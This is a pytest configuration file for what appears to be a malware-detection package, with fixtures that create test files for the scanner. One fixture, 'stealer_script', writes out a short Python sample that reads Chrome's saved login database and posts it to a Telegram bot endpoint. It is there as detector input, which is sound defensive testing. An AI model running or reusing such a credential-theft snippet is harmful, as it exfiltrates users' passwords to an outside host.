"""Pytest configuration and shared fixtures."""

import os
import sys
import tempfile
import pytest

# Ensure threatlens package is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")


@pytest.fixture
def tmp_file():
    """Create a temporary file that auto-deletes."""
    paths = []

    def _create(content: bytes, suffix: str = ".bin"):
        p = tempfile.mktemp(suffix=suffix)
        with open(p, "wb") as f:
            f.write(content)
        paths.append(p)
        return p

    yield _create

    for p in paths:
        if os.path.exists(p):
            os.unlink(p)


@pytest.fixture
def stealer_script(tmp_file):
    """Create a test stealer script."""
    code = (
        "import os, base64, requests\n"
        "chrome = os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data')\n"
        "data = open(chrome, 'rb').read()\n"
        "requests.post('https://api.telegram.org/bot123/sendDocument', files={'f': data})\n"
    )
    return tmp_file(code.encode(), suffix=".py")


@pytest.fixture
def clean_script(tmp_file):
    """Create a clean Python script."""
    return tmp_file(b"def add(a, b): return a + b\nprint(add(2, 3))\n", suffix=".py")


@pytest.fixture
def fake_pe(tmp_file):
    """Create a fake PE file."""
    return tmp_file(b"MZ" + b"\x00" * 500, suffix=".exe")
